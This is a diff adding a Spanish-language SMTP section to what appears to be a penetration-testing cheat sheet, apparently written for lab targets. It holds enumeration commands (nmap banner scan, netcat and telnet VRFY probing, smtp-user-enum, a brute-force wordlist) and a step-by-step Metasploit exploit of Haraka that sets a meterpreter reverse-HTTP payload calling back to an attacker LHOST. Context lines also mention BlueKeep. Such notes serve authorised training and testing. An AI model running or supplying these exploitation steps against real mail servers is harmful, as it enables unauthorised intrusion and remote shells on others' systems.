@@ -291,3 +291,41 @@ Utilidades de la herramienta todo terreno carnal
 Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
 post/windows/manage/enable_rdp (habilitar rdp em msfconsole
 ```
+
+### SMTP SERVICE - 25
+El Servicio de Transferencia de Correo Simple (SMTP) opera en el puerto 25 y es un protocolo fundamental para el envío de correos electrónicos en redes. Facilita la transferencia de mensajes entre servidores de correo, permitiendo la comunicación global mediante el enrutamiento y entrega de mensajes electrónicos a través de Internet.
+
+```python
+nmap -sV -script banner IP
+nc IP
+VRFY admin@openmailbox.xyz (en la coneccion de nc o telnet podemos validar esto)
+VRFY commander@openmailbox.xyz
+telnet IP 25
+HELO attacker.xyz 
+EHLO attacker.xyz
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t IP
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+/usr/share/metasploit-framework/data/wordlists/unix_users.txt
+```
+
+##### Metasploit
+Utilidades de la herramienta todo terreno carnal
+
+```python
+exploit/linux/smtp/haraka (set SRVPORT 9898, set email_to root@attackdefense.test, set payload linux/x64meterpreter_reverse_http, set rhosts, set lhosts)
+use auxiliary/scanner/smtp/smtp_enum
+search type:auxiliary name:smtp (con esto enumeramos en msfconsole para enumerar smtp)
+Example - exploit haraka:
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set rhost 192.150.137.3
+set LHOST 192.150.137.2
+exploit
+```
